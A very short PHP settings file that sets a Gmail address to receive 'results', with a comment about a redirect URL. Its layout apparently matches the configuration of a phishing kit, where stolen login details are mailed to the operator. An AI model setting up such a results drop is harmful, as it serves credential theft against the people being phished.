<?php
//Spcify Redirect URL

//Specify Email that get results.
$emailResult = "opakimab@gmail.com";

?>